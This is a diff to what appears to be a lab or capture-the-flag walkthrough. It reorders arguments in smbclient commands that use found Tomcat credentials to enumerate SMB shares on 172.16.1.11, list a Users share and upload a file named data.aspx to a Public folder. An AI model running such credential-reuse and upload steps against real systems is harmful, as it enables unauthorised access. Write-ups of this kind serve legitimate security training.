@@ -128,7 +128,7 @@ Lets begin with enumeration:
 
 Looks like wever got an SMB server. Notice that it is running "Apache Tomcat", recall that we have credentials that may work here. Lets use the login info and smbclient to enumerate the shares: 
 
-      smbclient -L //172.16.1.11 -U tomcat%Tomcatadm
+      smbclient -U tomcat%Tomcatadm -L //172.16.1.11
       
       	Sharename       Type      Comment
       	---------       ----      -------
@@ -151,7 +151,7 @@ As we can see, our creds are allowing us to list the directories.
 
 Lets start be issuing cmds (-c) to see what dir we have access to.
 
-      smbclient //172.16.1.11/Users -U tomcat%Tomcatadm -c "dir"
+      smbclient -U tomcat%Tomcatadm //172.16.1.11/Users -c "dir"
         .                                  DR        0  Mon Sep 27 20:37:05 2021
         ..                                 DR        0  Mon Sep 27 20:37:05 2021
         Default                           DHR        0  Tue Dec 15 05:32:11 2020
@@ -168,7 +168,7 @@ Now lets create a .txt to test if we can upload a file.
 
 - This fails if we try to write to Users, but if we more to Public we can upload the file:
 
-        smbclient //172.16.1.11/Users -U tomcat%Tomcatadm -c "cd Public; put data.aspx"
+        smbclient -U tomcat%Tomcatadm //172.16.1.11/Users -c "cd Public; put data.aspx"
 
 
 
